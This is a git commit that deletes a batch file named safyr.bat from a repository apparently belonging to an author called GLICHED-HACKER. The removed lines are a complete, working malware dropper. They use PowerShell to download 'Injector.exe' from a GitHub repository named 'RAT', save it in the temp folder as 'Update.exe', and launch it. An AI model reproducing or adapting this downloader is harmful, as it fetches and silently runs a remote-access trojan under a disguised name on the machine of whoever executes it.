8f8e965d530f34fff9d8b72c29a33586f8ca6b03
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-04 12:37:21 -0400

    Delete safyr.bat

--- safyr.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-set "TEMPFILE=%TEMP%\Update.exe"
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/Injector.exe' -OutFile '%TEMPFILE%'"
-start "" "%TEMPFILE%"
-exit /b
